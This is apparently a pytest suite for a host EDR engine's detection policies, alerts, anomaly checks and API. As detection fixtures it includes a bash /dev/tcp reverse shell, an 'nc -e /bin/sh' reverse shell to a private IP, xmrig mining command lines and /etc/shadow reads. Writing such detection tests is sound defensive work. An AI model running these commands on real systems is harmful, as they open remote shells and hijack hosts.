"""
Comprehensive tests for the HostRuntimeEngine (host EDR layer).

Tests cover:
- Model construction and defaults
- Event ingestion and retrieval
- Built-in policy seeding
- Custom policy creation and listing
- Policy evaluation / alert generation (crypto mining, reverse shell,
  privilege escalation, container escape, data exfiltration, file access)
- Alert acknowledgement
- Threat timeline filtering
- Runtime stats aggregation
- Anomaly detection
- Process tree reconstruction
- Multi-tenant isolation
- API router endpoints (10 endpoints)
"""

from __future__ import annotations

import os
import pytest
from datetime import datetime, timezone
from typing import Any, Dict

os.environ.setdefault("FIXOPS_MODE", "enterprise")
os.environ.setdefault("FIXOPS_API_TOKEN", "test-token")
os.environ.setdefault("FIXOPS_JWT_SECRET", "test-secret")
os.environ.setdefault("FIXOPS_DISABLE_TELEMETRY", "1")
os.environ.setdefault("FIXOPS_DISABLE_RATE_LIMIT", "1")

from fastapi import FastAPI
from fastapi.testclient import TestClient

from core.runtime_protection import (
    EventType,
    HostRuntimeEngine,
    PolicyAction,
    RuntimeAlert,
    RuntimeEvent,
    RuntimePolicy,
    ThreatLevel,
    _EDR_BUILTIN_POLICIES,
)
from apps.api.runtime_protection_router import router as runtime_router


# ===========================================================================
# Fixtures
# ===========================================================================


@pytest.fixture
def engine():
    """Fresh in-memory HostRuntimeEngine for each test."""
    return HostRuntimeEngine(db_path=":memory:")


@pytest.fixture
def app():
    """FastAPI test app with runtime router mounted."""
    _app = FastAPI()
    _app.include_router(runtime_router)
    return _app


@pytest.fixture
def client(app):
    """TestClient for the runtime router."""
    return TestClient(app)


def _make_event(
    engine: HostRuntimeEngine,
    event_type: EventType = EventType.PROCESS_EXEC,
    host: str = "web-01",
    process: str = "bash",
    user: str = "www-data",
    details: Dict[str, Any] | None = None,
    threat_level: ThreatLevel = ThreatLevel.NONE,
    org_id: str = "org_test",
) -> RuntimeEvent:
    """Helper: create and ingest a RuntimeEvent."""
    event = RuntimeEvent(
        event_type=event_type,
        source_host=host,
        process_name=process,
        user=user,
        details=details or {},
        threat_level=threat_level,
        org_id=org_id,
    )
    return engine.ingest_event(event)


# ===========================================================================
# Model tests
# ===========================================================================


class TestRuntimeEventModel:
    def test_defaults_populated(self):
        event = RuntimeEvent(
            event_type=EventType.PROCESS_EXEC,
            source_host="host-1",
            process_name="bash",
            user="root",
        )
        assert event.id
        assert event.threat_level == ThreatLevel.NONE
        assert isinstance(event.detected_at, datetime)
        assert event.org_id == "default"

    def test_all_event_types_valid(self):
        for et in EventType:
            e = RuntimeEvent(
                event_type=et, source_host="h", process_name="p", user="u"
            )
            assert e.event_type == et

    def test_all_threat_levels_valid(self):
        for tl in ThreatLevel:
            e = RuntimeEvent(
                event_type=EventType.PROCESS_EXEC,
                source_host="h", process_name="p", user="u",
                threat_level=tl,
            )
            assert e.threat_level == tl


class TestRuntimePolicyModel:
    def test_defaults_populated(self):
        p = RuntimePolicy(
            name="Test", event_type=EventType.FILE_ACCESS
        )
        assert p.id
        assert p.action == PolicyAction.ALERT
        assert p.enabled is True

    def test_all_actions_valid(self):
        for action in PolicyAction:
            p = RuntimePolicy(
                name="p", event_type=EventType.PROCESS_EXEC, action=action
            )
            assert p.action == action


class TestRuntimeAlertModel:
    def test_defaults_populated(self):
        a = RuntimeAlert(event_id="e1", policy_id="p1", threat_level=ThreatLevel.HIGH, message="test")
        assert a.id
        assert a.acknowledged is False
        assert isinstance(a.created_at, datetime)


# ===========================================================================
# Engine: ingest_event
# ===========================================================================


class TestIngestEvent:
    def test_ingest_returns_event(self, engine):
        event = _make_event(engine)
        assert event.id
        assert event.source_host == "web-01"

    def test_ingest_persists_event(self, engine):
        _make_event(engine, host="db-01", org_id="org_a")
        stats = engine.get_runtime_stats("org_a")
        assert stats["events_total"] == 1

    def test_ingest_multiple_events(self, engine):
        for i in range(5):
            _make_event(engine, host=f"host-{i}", org_id="org_multi")
        stats = engine.get_runtime_stats("org_multi")
        assert stats["events_total"] == 5

    def test_ingest_preserves_details(self, engine):
        event = _make_event(engine, details={"cmdline": "xmrig --pool", "pid": 42})
        # Verify round-trip via process tree
        tree = engine.get_process_tree("web-01", "org_test")
        assert any(n.get("pid") == 42 for n in tree)


# ===========================================================================
# Engine: built-in policies
# ===========================================================================


class TestBuiltinPolicies:
    def test_builtin_policies_seeded(self, engine):
        policies = engine.list_policies("org_x")
        names = [p.name for p in policies]
        assert "Crypto Mining Detection" in names
        assert "Reverse Shell Detection" in names
        assert "Privilege Escalation Detection" in names
        assert "Container Escape Detection" in names
        assert "Data Exfiltration Pattern Detection" in names
        assert "Suspicious Sensitive File Access" in names

    def test_builtin_policy_count(self, engine):
        policies = engine.list_policies("org_x")
        assert len(policies) >= len(_EDR_BUILTIN_POLICIES)

    def test_builtin_policies_idempotent(self, engine):
        # Re-seeding should not duplicate
        engine._seed_builtin_policies()
        policies = engine.list_policies("org_x")
        ids = [p.id for p in policies if p.id.startswith("builtin-")]
        assert len(ids) == len(set(ids))


# ===========================================================================
# Engine: create_policy / list_policies
# ===========================================================================


class TestPolicyCRUD:
    def test_create_custom_policy(self, engine):
        p = RuntimePolicy(
            name="Custom Test Policy",
            event_type=EventType.NETWORK_CONNECT,
            conditions={"process_names": ["curl"]},
            action=PolicyAction.ALERT,
            org_id="org_custom",
        )
        created = engine.create_policy(p)
        assert created.id == p.id
        assert created.name == "Custom Test Policy"

    def test_list_includes_custom_and_builtin(self, engine):
        p = RuntimePolicy(
            name="My Policy",
            event_type=EventType.FILE_ACCESS,
            org_id="org_list",
        )
        engine.create_policy(p)
        policies = engine.list_policies("org_list")
        names = [pol.name for pol in policies]
        assert "My Policy" in names
        assert "Suspicious Sensitive File Access" in names

    def test_disabled_policy_in_list(self, engine):
        p = RuntimePolicy(
            name="Disabled Policy",
            event_type=EventType.PROCESS_EXEC,
            enabled=False,
            org_id="org_dis",
        )
        engine.create_policy(p)
        policies = engine.list_policies("org_dis")
        found = next((pol for pol in policies if pol.name == "Disabled Policy"), None)
        assert found is not None
        assert found.enabled is False


# ===========================================================================
# Engine: evaluate_policies — built-in detections
# ===========================================================================


class TestPolicyEvaluation:
    def test_crypto_mining_xmrig_detected(self, engine):
        event = RuntimeEvent(
            event_type=EventType.PROCESS_EXEC,
            source_host="worker-01", process_name="xmrig",
            user="root", details={"cmdline": "xmrig --pool pool.supportxmr.com"},
            org_id="org_eval",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_eval")
        assert len(alerts) >= 1
        messages = [a.message for a in alerts]
        assert any("Crypto Mining" in m for m in messages)

    def test_crypto_mining_cmdline_detected(self, engine):
        event = RuntimeEvent(
            event_type=EventType.PROCESS_EXEC,
            source_host="worker-02", process_name="python3",
            user="ubuntu", details={"cmdline": "python3 miner.py stratum+tcp://xmr.pool:3333"},
            org_id="org_eval",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_eval")
        assert any("Crypto Mining" in a.message for a in alerts)

    def test_reverse_shell_bash_detected(self, engine):
        event = RuntimeEvent(
            event_type=EventType.NETWORK_CONNECT,
            source_host="api-01", process_name="bash",
            user="www-data", details={"cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
            org_id="org_eval",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_eval")
        assert any("Reverse Shell" in a.message for a in alerts)

    def test_reverse_shell_nc_detected(self, engine):
        event = RuntimeEvent(
            event_type=EventType.NETWORK_CONNECT,
            source_host="api-02", process_name="nc",
            user="daemon", details={"cmdline": "nc -e /bin/sh 10.0.0.1 4444"},
            org_id="org_eval",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_eval")
        assert any("Reverse Shell" in a.message for a in alerts)

    def test_privilege_escalation_uid_detected(self, engine):
        event = RuntimeEvent(
            event_type=EventType.PRIVILEGE_ESCALATION,
            source_host="db-01", process_name="sudo",
            user="appuser", details={"uid_before": 1000, "uid_after": 0},
            org_id="org_eval",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_eval")
        assert any("Privilege Escalation" in a.message for a in alerts)

    def test_privilege_escalation_flag_detected(self, engine):
        event = RuntimeEvent(
            event_type=EventType.PRIVILEGE_ESCALATION,
            source_host="db-02", process_name="pkexec",
            user="user1", details={"escalated": True},
            org_id="org_eval",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_eval")
        assert any("Privilege Escalation" in a.message for a in alerts)

    def test_container_escape_docker_socket(self, engine):
        event = RuntimeEvent(
            event_type=EventType.CONTAINER_ESCAPE,
            source_host="k8s-node-01", process_name="runc",
            user="root", details={"indicators": ["docker_socket_access"]},
            org_id="org_eval",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_eval")
        assert any("Container Escape" in a.message for a in alerts)

    def test_container_escape_privileged(self, engine):
        event = RuntimeEvent(
            event_type=EventType.CONTAINER_ESCAPE,
            source_host="k8s-node-02", process_name="containerd",
            user="root", details={"indicators": ["privileged_container", "host_pid_namespace"]},
            org_id="org_eval",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_eval")
        assert len(alerts) >= 1

    def test_data_exfiltration_large_transfer(self, engine):
        event = RuntimeEvent(
            event_type=EventType.NETWORK_CONNECT,
            source_host="web-03", process_name="curl",
            user="ubuntu", details={"bytes_out": 200 * 1024 * 1024},  # 200 MB
            org_id="org_eval",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_eval")
        assert any("Data Exfiltration" in a.message for a in alerts)

    def test_sensitive_file_access_shadow(self, engine):
        event = RuntimeEvent(
            event_type=EventType.FILE_ACCESS,
            source_host="auth-01", process_name="cat",
            user="attacker", details={"path": "/etc/shadow"},
            org_id="org_eval",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_eval")
        assert any("Sensitive File" in a.message for a in alerts)

    def test_no_alert_for_benign_event(self, engine):
        event = RuntimeEvent(
            event_type=EventType.PROCESS_EXEC,
            source_host="web-01", process_name="nginx",
            user="www-data", details={"cmdline": "nginx -g daemon off;"},
            org_id="org_eval",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_eval")
        assert alerts == []

    def test_alert_threat_level_critical_for_crypto(self, engine):
        event = RuntimeEvent(
            event_type=EventType.PROCESS_EXEC,
            source_host="worker-03", process_name="xmrig",
            user="root", details={},
            org_id="org_eval",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_eval")
        critical = [a for a in alerts if a.threat_level == ThreatLevel.CRITICAL]
        assert len(critical) >= 1


# ===========================================================================
# Engine: acknowledge_alert
# ===========================================================================


class TestAcknowledgeAlert:
    def test_acknowledge_existing_alert(self, engine):
        event = RuntimeEvent(
            event_type=EventType.PROCESS_EXEC,
            source_host="worker-ack", process_name="xmrig",
            user="root", org_id="org_ack",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_ack")
        assert alerts
        alert_id = alerts[0].id
        result = engine.acknowledge_alert(alert_id)
        assert result is True
        active = engine.get_active_alerts("org_ack")
        assert all(a.id != alert_id for a in active)

    def test_acknowledge_nonexistent_alert(self, engine):
        result = engine.acknowledge_alert("nonexistent-id-xyz")
        assert result is False

    def test_acknowledge_removes_from_active(self, engine):
        event = RuntimeEvent(
            event_type=EventType.PROCESS_EXEC,
            source_host="worker-ack2", process_name="xmrig",
            user="root", org_id="org_ack2",
        )
        engine.ingest_event(event)
        alerts = engine.evaluate_policies(event, "org_ack2")
        for a in alerts:
            engine.acknowledge_alert(a.id)
        active = engine.get_active_alerts("org_ack2")
        assert active == []


# ===========================================================================
# Engine: get_threat_timeline
# ===========================================================================


class TestThreatTimeline:
    def test_only_non_none_threats_returned(self, engine):
        _make_event(engine, threat_level=ThreatLevel.NONE, org_id="org_tl")
        _make_event(engine, threat_level=ThreatLevel.HIGH, org_id="org_tl")
        _make_event(engine, threat_level=ThreatLevel.CRITICAL, org_id="org_tl")
        timeline = engine.get_threat_timeline("org_tl", hours=1)
        assert len(timeline) == 2
        assert all(e.threat_level != ThreatLevel.NONE for e in timeline)

    def test_timeline_empty_when_no_threats(self, engine):
        _make_event(engine, threat_level=ThreatLevel.NONE, org_id="org_tl2")
        timeline = engine.get_threat_timeline("org_tl2", hours=24)
        assert timeline == []


# ===========================================================================
# Engine: get_runtime_stats
# ===========================================================================


class TestRuntimeStats:
    def test_stats_zero_for_empty_org(self, engine):
        stats = engine.get_runtime_stats("org_empty")
        assert stats["events_total"] == 0
        assert stats["alerts_total"] == 0
        assert stats["alerts_active"] == 0

    def test_stats_count_events_by_type(self, engine):
        _make_event(engine, event_type=EventType.PROCESS_EXEC, org_id="org_stats")
        _make_event(engine, event_type=EventType.FILE_ACCESS, org_id="org_stats")
        _make_event(engine, event_type=EventType.NETWORK_CONNECT, org_id="org_stats")
        stats = engine.get_runtime_stats("org_stats")
        assert stats["events_total"] == 3
        assert stats["events_by_type"]["process_exec"] == 1
        assert stats["events_by_type"]["file_access"] == 1
        assert stats["events_by_type"]["network_connect"] == 1

    def test_stats_top_hosts(self, engine):
        for _ in range(3):
            _make_event(engine, host="host-a", org_id="org_stats2")
        _make_event(engine, host="host-b", org_id="org_stats2")
        stats = engine.get_runtime_stats("org_stats2")
        hosts = [h["host"] for h in stats["top_hosts"]]
        assert "host-a" in hosts
        assert stats["top_hosts"][0]["host"] == "host-a"
        assert stats["top_hosts"][0]["event_count"] == 3

    def test_stats_alerts_active_count(self, engine):
        event = RuntimeEvent(
            event_type=EventType.PROCESS_EXEC,
            source_host="worker", process_name="xmrig",
            user="root", org_id="org_statsalert",
        )
        engine.ingest_event(event)
        engine.evaluate_policies(event, "org_statsalert")
        stats = engine.get_runtime_stats("org_statsalert")
        assert stats["alerts_total"] >= 1
        assert stats["alerts_active"] >= 1


# ===========================================================================
# Engine: detect_anomalies
# ===========================================================================


class TestDetectAnomalies:
    def test_no_anomalies_for_empty_org(self, engine):
        anomalies = engine.detect_anomalies("org_no_anom")
        assert anomalies == []

    def test_high_volume_anomaly_detected(self, engine):
        for i in range(55):
            _make_event(engine, host="noisy-host", org_id="org_anom")
        anomalies = engine.detect_anomalies("org_anom")
        types = [a["type"] for a in anomalies]
        assert "high_event_volume" in types

    def test_lateral_movement_detected(self, engine):
        for i in range(4):
            _make_event(engine, host=f"host-{i}", user="attacker", org_id="org_lateral")
        anomalies = engine.detect_anomalies("org_lateral")
        types = [a["type"] for a in anomalies]
        assert "lateral_movement" in types

    def test_anomaly_has_required_fields(self, engine):
        for _ in range(55):
            _make_event(engine, host="busy-host", org_id="org_fields")
        anomalies = engine.detect_anomalies("org_fields")
        for anom in anomalies:
            assert "type" in anom
            assert "description" in anom
            assert "severity" in anom
            assert "details" in anom


# ===========================================================================
# Engine: get_process_tree
# ===========================================================================


class TestProcessTree:
    def test_empty_tree_for_unknown_host(self, engine):
        tree = engine.get_process_tree("no-such-host", "org_pt")
        assert tree == []

    def test_process_tree_single_node(self, engine):
        _make_event(engine, event_type=EventType.PROCESS_EXEC,
                    host="pt-host", process="nginx", user="www-data",
                    details={"pid": 100, "ppid": 1, "cmdline": "nginx"},
                    org_id="org_pt")
        tree = engine.get_process_tree("pt-host", "org_pt")
        assert len(tree) >= 1

    def test_process_tree_parent_child(self, engine):
        _make_event(engine, event_type=EventType.PROCESS_EXEC,
                    host="pt-host2", process="bash",
                    details={"pid": 10, "ppid": 1, "cmdline": "bash"},
                    org_id="org_pt2")
        _make_event(engine, event_type=EventType.PROCESS_EXEC,
                    host="pt-host2", process="xmrig",
                    details={"pid": 11, "ppid": 10, "cmdline": "xmrig --pool x"},
                    org_id="org_pt2")
        tree = engine.get_process_tree("pt-host2", "org_pt2")
        # bash should be root with xmrig as child
        root = next((n for n in tree if n["process_name"] == "bash"), None)
        assert root is not None
        assert any(c["process_name"] == "xmrig" for c in root.get("children", []))

    def test_only_process_exec_events_in_tree(self, engine):
        _make_event(engine, event_type=EventType.FILE_ACCESS,
                    host="pt-host3", process="cat", org_id="org_pt3")
        tree = engine.get_process_tree("pt-host3", "org_pt3")
        assert tree == []


# ===========================================================================
# Multi-tenant isolation
# ===========================================================================


class TestMultiTenantIsolation:
    def test_stats_isolated_by_org(self, engine):
        _make_event(engine, org_id="org_a")
        _make_event(engine, org_id="org_b")
        _make_event(engine, org_id="org_b")
        assert engine.get_runtime_stats("org_a")["events_total"] == 1
        assert engine.get_runtime_stats("org_b")["events_total"] == 2

    def test_alerts_isolated_by_org(self, engine):
        for org in ["org_c", "org_d"]:
            event = RuntimeEvent(
                event_type=EventType.PROCESS_EXEC,
                source_host="worker", process_name="xmrig",
                user="root", org_id=org,
            )
            engine.ingest_event(event)
            engine.evaluate_policies(event, org)
        alerts_c = engine.get_active_alerts("org_c")
        alerts_d = engine.get_active_alerts("org_d")
        assert len(alerts_c) >= 1
        assert len(alerts_d) >= 1
        c_ids = {a.id for a in alerts_c}
        d_ids = {a.id for a in alerts_d}
        assert c_ids.isdisjoint(d_ids)


# ===========================================================================
# API router tests
# ===========================================================================


class TestAPIIngestEvent:
    def test_ingest_event_201(self, client):
        resp = client.post("/api/v1/runtime/events?org_id=org_api", json={
            "event_type": "process_exec",
            "source_host": "web-01",
            "process_name": "nginx",
            "user": "www-data",
        })
        assert resp.status_code == 201
        data = resp.json()
        assert "event_id" in data
        assert data["status"] == "ingested"

    def test_ingest_event_missing_field(self, client):
        resp = client.post("/api/v1/runtime/events?org_id=org_api", json={
            "event_type": "process_exec",
            "source_host": "web-01",
        })
        assert resp.status_code == 422


class TestAPIIngestEvaluate:
    def test_evaluate_xmrig_generates_alert(self, client):
        resp = client.post("/api/v1/runtime/events/evaluate?org_id=org_eval_api", json={
            "event_type": "process_exec",
            "source_host": "miner-01",
            "process_name": "xmrig",
            "user": "root",
            "details": {},
        })
        assert resp.status_code == 201
        data = resp.json()
        assert data["alerts_generated"] >= 1

    def test_evaluate_benign_no_alerts(self, client):
        resp = client.post("/api/v1/runtime/events/evaluate?org_id=org_eval_api2", json={
            "event_type": "process_exec",
            "source_host": "web-01",
            "process_name": "nginx",
            "user": "www-data",
        })
        assert resp.status_code == 201
        assert resp.json()["alerts_generated"] == 0


class TestAPICreateListPolicies:
    def test_create_policy_201(self, client):
        resp = client.post("/api/v1/runtime/policies?org_id=org_pol_api", json={
            "name": "My Test Policy",
            "event_type": "file_access",
            "conditions": {"paths": ["/tmp/malware"]},
            "action": "alert",
        })
        assert resp.status_code == 201
        data = resp.json()
        assert data["name"] == "My Test Policy"
        assert "policy_id" in data

    def test_list_policies_returns_builtins(self, client):
        resp = client.get("/api/v1/runtime/policies?org_id=org_pol_list")
        assert resp.status_code == 200
        data = resp.json()
        names = [p["name"] for p in data["policies"]]
        assert "Crypto Mining Detection" in names


class TestAPIAlerts:
    def test_get_active_alerts(self, client):
        # Ingest a mining event to generate alerts
        client.post("/api/v1/runtime/events/evaluate?org_id=org_alert_api", json={
            "event_type": "process_exec",
            "source_host": "miner",
            "process_name": "xmrig",
            "user": "root",
        })
        resp = client.get("/api/v1/runtime/alerts?org_id=org_alert_api")
        assert resp.status_code == 200
        data = resp.json()
        assert data["total"] >= 1

    def test_acknowledge_nonexistent_alert_404(self, client):
        resp = client.post("/api/v1/runtime/alerts/no-such-id/ack?org_id=org_x")
        assert resp.status_code == 404

    def test_acknowledge_existing_alert(self, client):
        client.post("/api/v1/runtime/events/evaluate?org_id=org_ack_api", json={
            "event_type": "process_exec",
            "source_host": "miner2",
            "process_name": "xmrig",
            "user": "root",
        })
        alerts_resp = client.get("/api/v1/runtime/alerts?org_id=org_ack_api")
        alerts = alerts_resp.json()["alerts"]
        assert alerts
        alert_id = alerts[0]["id"]
        ack_resp = client.post(f"/api/v1/runtime/alerts/{alert_id}/ack?org_id=org_ack_api")
        assert ack_resp.status_code == 200
        assert ack_resp.json()["acknowledged"] is True


class TestAPIThreatsStatsAnomalies:
    def test_get_threat_timeline(self, client):
        resp = client.get("/api/v1/runtime/threats?org_id=org_tl_api&hours=24")
        assert resp.status_code == 200
        data = resp.json()
        assert "events" in data
        assert data["hours"] == 24

    def test_get_runtime_stats(self, client):
        resp = client.get("/api/v1/runtime/stats?org_id=org_stats_api")
        assert resp.status_code == 200
        data = resp.json()
        assert "events_total" in data
        assert "alerts_active" in data

    def test_detect_anomalies(self, client):
        resp = client.get("/api/v1/runtime/anomalies?org_id=org_anom_api")
        assert resp.status_code == 200
        data = resp.json()
        assert "anomalies" in data

    def test_get_process_tree(self, client):
        resp = client.get("/api/v1/runtime/hosts/web-01/process-tree?org_id=org_pt_api")
        assert resp.status_code == 200
        data = resp.json()
        assert "process_tree" in data
        assert data["host"] == "web-01"
